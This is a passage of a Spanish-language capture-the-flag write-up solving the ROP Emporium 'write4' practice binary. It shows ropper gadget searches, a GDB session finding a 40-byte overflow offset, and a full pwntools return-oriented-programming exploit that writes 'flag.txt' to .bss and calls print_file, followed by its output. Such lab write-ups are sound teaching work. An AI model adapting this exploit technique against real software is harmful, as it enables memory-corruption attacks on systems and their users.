+<font color="#CC0000">0x000000000040068c</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r12</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r13</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r14</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r15</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x000000000040068e</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r13</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r14</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r15</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x0000000000400690</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r14</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r15</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x0000000000400692</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r15</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x000000000040057b</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">rbp</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>mov</b></font> <font color="#D3D7CF">edi, 0x601038</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>jmp</b></font> <font color="#D3D7CF">rax</font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x000000000040068b</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">rbp</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r12</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r13</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r14</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r15</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x000000000040068f</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">rbp</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r14</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r15</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x0000000000400588</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">rbp</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x0000000000400693</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">rdi</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x0000000000400691</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">rsi</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r15</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>; </b></font>
+<font color="#CC0000">0x000000000040068d</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">rsp</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r13</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r14</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">r15</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>;</b></font></pre>
+<p>Este gadget nos permite cargar en r14 la dirección de la sección .bss (donde escribiremos la cadena flag.txt) y en r15 la propia cadena flag.txt. Ahora que podemos posicionar estos valores en registros, el siguiente paso es encontrar un gadget que realice la operación de mover (mov) el contenido de r15 hacia la dirección almacenada en r14, completando así el proceso de escritura en memoria.</p>
+<p>Una vez que la cadena flag.txt esté correctamente almacenada en la sección .bss, el siguiente paso es preparar el argumento para la función print_file, que se encargará de abrir y leer el contenido de la flag.</p>
+<p>Para ello, necesitamos un gadget que cargue un valor en el registro rdi, ya que este es el primer argumento en las convenciones de llamada en sistemas Linux de 64 bits (x86_64 ABI). Utilizando ropper y filtrando por pop rdi, encontramos el siguiente gadget.</p>
+<pre><font color="#CC0000"><b>$</b></font> ropper --file write4 --search &apos;pop rdi&apos;
+<font color="#4E9A06">[INFO]</font> Load gadgets from cache
+<font color="#4E9A06">[LOAD]</font> loading... <font color="#D3D7CF">100%</font>
+<font color="#4E9A06">[LOAD]</font> removing double gadgets... <font color="#D3D7CF">100%</font>
+<font color="#4E9A06">[INFO]</font> <font color="#D3D7CF">Searching for gadgets: pop rdi</font>
+
+<font color="#4E9A06">[INFO]</font> <font color="#D3D7CF">File: write4</font>
+<font color="#CC0000">0x0000000000400693</font>: <font color="#C4A000"><b>pop</b></font> <font color="#D3D7CF">rdi</font><font color="#3465A4"><b>; </b></font><font color="#C4A000"><b>ret</b></font><font color="#3465A4"><b>;</b></font></pre>
+<p>Finalmente, para construir el exploit completo, solo nos falta calcular el offset, que es la distancia entre el inicio de nuestro input y la dirección que controla el flujo de ejecución. Este valor se calculará utilizando gdb, permitiéndonos determinar con precisión en qué posición debemos insertar nuestros gadgets y direcciones.</p>
+<pre><font color="#CC0000"><b>gef➤  </b></font>pattern create 250                                                                                                                                                                                                                                                                                                     
+<font color="#3465A4"><b>[+]</b></font> Generating a pattern of 250 bytes (n=8)                                                                                                                                                                                                                                                                                  
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabga                                                                   
+<font color="#4E9A06"><b>[+]</b></font> Saved as &apos;$_gef0&apos;                                                                                                                                                                                                                                                                                                        
+<font color="#CC0000"><b>gef➤  </b></font>Quit                                                                                                                                                                                                                                                                                                                   
+<font color="#CC0000"><b>gef➤  </b></font>r                                                                                                                                                                                                                                                                                                                      
+Starting program: <font color="#4E9A06">/home/abund4nt/pwn/ROP Emporium/write4/write4</font>                                                                                                                                                                                                                                                              
+[Thread debugging using libthread_db enabled]                                                                                                                                                                                                                                                                                
+Using host libthread_db library &quot;<font color="#4E9A06">/lib/x86_64-linux-gnu/libthread_db.so.1</font>&quot;.                                                                                                                                                                                                                                                   
+write4 by ROP Emporium                                                                                                                                                                                                                                                                                                       
+x86_64                                                                                                                                                                                                                                                                                                                       
+                                                                                                                                                                                                                                                                                                                             
+Go ahead and give me the input already!                                                                                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                                                                                                             
+&gt; aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabga                                                                 
+Thank you!                                                                                                                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                                                                                                             
+Program received signal SIGSEGV, Segmentation fault.                                                                                                                                                                                                                                                                         
+<font color="#3465A4">0x00007ffff7c00942</font> in <font color="#C4A000">pwnme</font> () from <font color="#4E9A06">./libwrite4.so</font>                                                                                                                                                                                                                                                                           
+[ Legend: <font color="#CC0000"><b>Modified register</b></font> | <font color="#CC0000">Code</font> | <font color="#4E9A06">Heap</font> | <font color="#75507B">Stack</font> | <font color="#C4A000">String</font> ]                                                                                                                                                                                                                                                                 
+<font color="#585858"><b>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#06989A">registers</font><font color="#585858"><b> ────</b></font>                                                                                 
+<font color="#CC0000"><b>$rax   </b></font>: 0xb                                                                                                                                                                                                                                                                   
+<font color="#CC0000"><b>$rbx   </b></font>: <font color="#75507B">0x00007fffffffde68</font>  →  <font color="#75507B">0x00007fffffffe1d8</font>  →  <font color="#C4A000">&quot;/home/abund4nt/pwn/ROP Emporium/write4/write4&quot;</font>                                                                                                                                                                         
+<font color="#CC0000"><b>$rcx   </b></font>: <font color="#CC0000">0x00007ffff791c574</font>  →  0x5477fffff0003d48 (&quot;<font color="#C4A000">H=</font>&quot;?)                                                                                                                                                                                                                     
+<font color="#3465A4">$rdx   </font>: 0x0                                                                                                                                                                                                                                                                   
+<font color="#CC0000"><b>$rsp   </b></font>: <font color="#75507B">0x00007fffffffdd38</font>  →  <font color="#C4A000">&quot;faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]&quot;</font>                                                                                                                                                                                      
+<font color="#CC0000"><b>$rbp   </b></font>: 0x6161616161616165 (&quot;<font color="#C4A000">eaaaaaaa</font>&quot;?)                                                                                                                                                                                                                                      
+<font color="#CC0000"><b>$rsi   </b></font>: 0x00007ffff7a04643  →  0xa05710000000000a (&quot;<font color="#C4A000">\n</font>&quot;?)                                                                                                                                                                                                                     
+<font color="#CC0000"><b>$rdi   </b></font>: 0x00007ffff7a05710  →  0x0000000000000000                                                                                                                                                                                                                             
+<font color="#CC0000"><b>$rip   </b></font>: <font color="#CC0000">0x00007ffff7c00942</font>  →  <font color="#585858"><b>&lt;pwnme+0098&gt; ret </b></font>                                                                                                                                                                                                                              
+<font color="#CC0000"><b>$r8    </b></font>: 0xa                                                                                                                                                                                                                                                                   
+<font color="#CC0000"><b>$r9    </b></font>: <font color="#CC0000">0x00007ffff7fca380</font>  →  <font color="#585858"><b>&lt;_dl_fini+0000&gt; endbr64 </b></font>                                                                                                                                                                                                                       
+<font color="#CC0000"><b>$r10   </b></font>: 0x00007ffff78109d8  →  0x0011001200001bd3                                                                                                                                                                                                                             
+<font color="#CC0000"><b>$r11   </b></font>: 0x202                                                                                                                                                                                                                                                                 
+<font color="#CC0000"><b>$r12   </b></font>: 0x1                                                                                                                                                                                                                                                                   
+<font color="#3465A4">$r13   </font>: 0x0                                                                                                                                                                                                                                                                   
+<font color="#3465A4">$r14   </font>: 0x0                                                                                                                                                                                                                                                                   
+<font color="#CC0000"><b>$r15   </b></font>: 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000                                                                                                                                                                                                      
+<font color="#CC0000"><b>$eflags</b></font>: [zero carry <b>PARITY</b> adjust sign trap <b>INTERRUPT</b> direction overflow <b>RESUME</b> virtualx86 identification]                                                                                                                                                                    
+<font color="#3465A4">$cs</font>: 0x33 <font color="#3465A4">$ss</font>: 0x2b <font color="#3465A4">$ds</font>: 0x00 <font color="#3465A4">$es</font>: 0x00 <font color="#3465A4">$fs</font>: 0x00 <font color="#3465A4">$gs</font>: 0x00                                                                                                                                                                                                                    
+<font color="#585858"><b>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#06989A">stack</font><font color="#585858"><b> ────</b></font>                                                                                 
+<font color="#06989A">0x00007fffffffdd38</font>│+0x0000: <font color="#C4A000">&quot;faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]&quot;</font>   <font color="#3465A4"><b> ← $rsp</b></font>                                                                                                                                                                                
+<font color="#06989A">0x00007fffffffdd40</font>│+0x0008: <font color="#C4A000">&quot;gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]&quot;</font>                                                                                                                                                                                          
+<font color="#06989A">0x00007fffffffdd48</font>│+0x0010: <font color="#C4A000">&quot;haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaana[...]&quot;</font>                                                                                                                                                                                          
+<font color="#06989A">0x00007fffffffdd50</font>│+0x0018: <font color="#C4A000">&quot;iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoa[...]&quot;</font>                                                                                                                                                                                          
+<font color="#06989A">0x00007fffffffdd58</font>│+0x0020: <font color="#C4A000">&quot;jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]&quot;</font>                                                                                                                                                                                          
+<font color="#06989A">0x00007fffffffdd60</font>│+0x0028: <font color="#C4A000">&quot;kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]&quot;</font>                                                                                                                                                                                          
+<font color="#06989A">0x00007fffffffdd68</font>│+0x0030: <font color="#C4A000">&quot;laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]&quot;</font>                                                                                                                                                                                          
+<font color="#06989A">0x00007fffffffdd70</font>│+0x0038: <font color="#C4A000">&quot;maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]&quot;</font>                                                                                                                                                                                          
+<font color="#585858"><b>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#06989A">code:x86:64</font><font color="#585858"><b> ────</b></font>                                                                                 
+   <font color="#585858"><b>0x7ffff7c0093b &lt;pwnme+0091&gt;     call   0x7ffff7c00730 &lt;puts@plt&gt;</b></font>                                                                                                                                                                                                            
+   <font color="#585858"><b>0x7ffff7c00940 &lt;pwnme+0096&gt;     nop    </b></font>                                                                                                                                                                                                                                     
+   <font color="#585858"><b>0x7ffff7c00941 &lt;pwnme+0097&gt;     leave  </b></font>                                                                                                                                                                                                                                     
+ <font color="#4E9A06">→ 0x7ffff7c00942 &lt;pwnme+0098&gt;     ret    </font>                         
+<font color="#CC0000"><b>[!]</b></font> Cannot disassemble from $PC                                                                                                                                                                                                                                                
+<font color="#585858"><b>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#06989A">threads</font><font color="#585858"><b> ────</b></font>                                                                                                                               
+[<font color="#4E9A06"><b>#0</b></font>] Id 1, Name: &quot;write4&quot;, <font color="#CC0000"><b>stopped</b></font> <font color="#3465A4">0x7ffff7c00942</font> in <font color="#C4A000"><b>pwnme</b></font> (), reason: <font color="#75507B"><b>SIGSEGV</b></font>                                                                                
+<font color="#585858"><b>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#06989A">trace</font><font color="#585858"><b> ────</b></font>                                                                                                                               
+[<font color="#4E9A06"><b>#0</b></font>] 0x7ffff7c00942 → <font color="#4E9A06">pwnme</font>()                                      
+<font color="#585858"><b>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</b></font>                                                                                                                               
+<font color="#4E9A06"><b>gef➤  </b></font>pattern search $rsp                                                                                                              
+<font color="#3465A4"><b>[+]</b></font> Searching for &apos;6661616161616161&apos;/&apos;6161616161616166&apos; with period=8                                                                  
+<font color="#4E9A06"><b>[+]</b></font> Found at offset 40 (little-endian search) <font color="#CC0000"><b>likely</b></font> </pre>
+<p>Generamos una secuencia de Brujin de 250 bytes con pattern create 250, la cual fue pasada como entrada al programa para provocar un desbordamiento de buffer y un fallo por SIGSEGV. Al utilizar pattern search $rsp en GDB, buscamos el patrón en el registro rsp y encontramos que el desbordamiento ocurre a los 40 bytes, lo que indica que ese es el offset necesario para sobrescribir el valor de rsp. Con esta información, podemos proceder a ajustar el payload y explotar el desbordamiento para controlar el flujo de ejecución, como en el caso de un ataque ROP.</p>
+
+<h2 id="exploit-final">
+  Exploit final.
+  
+  <a hidden class="anchor" href="#exploit-final">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+<p>Con este exploit resolvemos el desafio y logramos leer la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./write4&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MOV_QWORD_PTR_R14_R15_RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400628</span>
+</span></span><span style="display:flex;"><span>POP_R14_POP_R15_RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400690</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bss <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000601038</span>
+</span></span><span style="display:flex;"><span>POP_RDI_RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400693</span>
+</span></span><span style="display:flex;"><span>RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004004e6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print_file_function <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400510</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> junk
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(POP_R14_POP_R15_RET)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(bss)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag.txt&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(MOV_QWORD_PTR_R14_R15_RET)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(POP_RDI_RET)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(bss)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(RET)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(print_file_function)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Primero, configuramos el contexto y la conexión usando la librería pwntools. Posteriormente, determinamos el offset de 40 bytes entre el inicio de nuestro input y el valor de rsp. Luego, se definen los gadgets clave para la explotación, como POP_R14_POP_R15_RET para cargar los valores en los registros y MOV_QWORD_PTR_R14_R15_RET para almacenar la cadena &lsquo;flag.txt&rsquo; en la sección BSS.</p>
+<p>En el payload, primero llenamos con la cantidad necesaria de basura para alcanzar el offset y sobrescribir el valor de rsp. Usamos el gadget POP_R14_POP_R15_RET para cargar la dirección de memoria de la sección BSS y la cadena &lsquo;flag.txt&rsquo;, y luego movemos estos valores con MOV_QWORD_PTR_R14_R15_RET. Después, cargamos la dirección de la sección BSS en el registro rdi usando el gadget POP_RDI_RET, seguido de un retorno con RET y finalmente invocamos la función print_file_function para imprimir el contenido del archivo &lsquo;flag.txt&rsquo; desde la BSS.</p>
+<p>Al ejecutar el exploit, el programa imprime la flag correctamente. El flujo completo muestra cómo, al controlar el stack mediante ROP, podemos ejecutar una función deseada para leer un archivo y obtener la flag.</p>
+<pre><font color="#CC0000"><b>$</b></font> python3 sol.py 
+[<font color="#3465A4"><b>*</b></font>] &apos;/home/abund4nt/pwn/ROP Emporium/write4/write4&apos;
+    Arch:       amd64-64-little
+    RELRO:      <font color="#C4A000">Partial RELRO</font>
+    Stack:      <font color="#CC0000">No canary found</font>
+    NX:         <font color="#4E9A06">NX enabled</font>
+    PIE:        <font color="#CC0000">No PIE (0x400000)</font>
+    RUNPATH:    <font color="#CC0000">b&apos;.&apos;</font>
+    Stripped:   <font color="#CC0000">No</font>
+[<font color="#4E9A06"><b>+</b></font>] Starting local process &apos;/home/abund4nt/pwn/ROP Emporium/write4/write4&apos;: pid 45463
+[<font color="#3465A4"><b>*</b></font>] Switching to interactive mode
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+[<font color="#3465A4"><b>*</b></font>] Got EOF while reading in interactive
+<font color="#CC0000"><b>$</b></font></pre>
+
+
+
+
+
+
+
+
+
+
+
+<nav class="pagenav">
+  
+  <div></div>
+  
+  
+    <a class="next" href="/writeups/htb-console-htb/">
+      <span class="direction">Next »</span>
+      <br>
+      <span> HTB Console - HackTheBox </span>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+
+
+      </main>
+      <footer>
+  <div class="copyright">
+    
+  </div>
+</footer>
+
+    </div>
+  </body>
+</html>
